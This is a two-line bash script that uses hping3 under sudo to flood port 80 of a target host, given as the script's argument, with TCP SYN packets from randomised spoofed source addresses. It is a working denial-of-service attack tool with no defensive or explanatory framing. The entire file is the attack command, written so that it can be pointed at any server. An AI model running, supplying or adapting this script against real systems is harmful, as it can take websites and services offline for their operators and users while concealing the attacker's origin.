#!/bin/bash
sudo hping3 -S -p 80 --flood --rand-source $1
